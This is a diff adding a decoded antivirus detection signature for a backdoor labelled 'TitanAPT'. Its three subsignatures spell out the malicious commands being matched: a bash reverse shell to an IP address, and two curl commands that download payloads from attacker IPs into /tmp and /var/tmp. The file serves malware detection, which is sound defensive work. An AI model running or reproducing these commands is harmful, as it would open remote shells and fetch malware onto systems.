@@ -1,0 +1,18 @@
+VIRUS NAME: Txt.Backdoor.TitanAPT-10058446-0
+TDB: Engine:90-255,Target:7
+LOGICAL EXPRESSION: 0|1|2
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+bash -i >& /dev/tcp/212.11.64.105/{WILDCARD_ANY_STRING(LENGTH==4)} 0>&1
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+curl 212.11.64.105:7548/k8s.yaml -o /tmp/k8s.yaml
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+curl 185.196.10.247/os_check_agent -o /var/tmp/os_check_agent
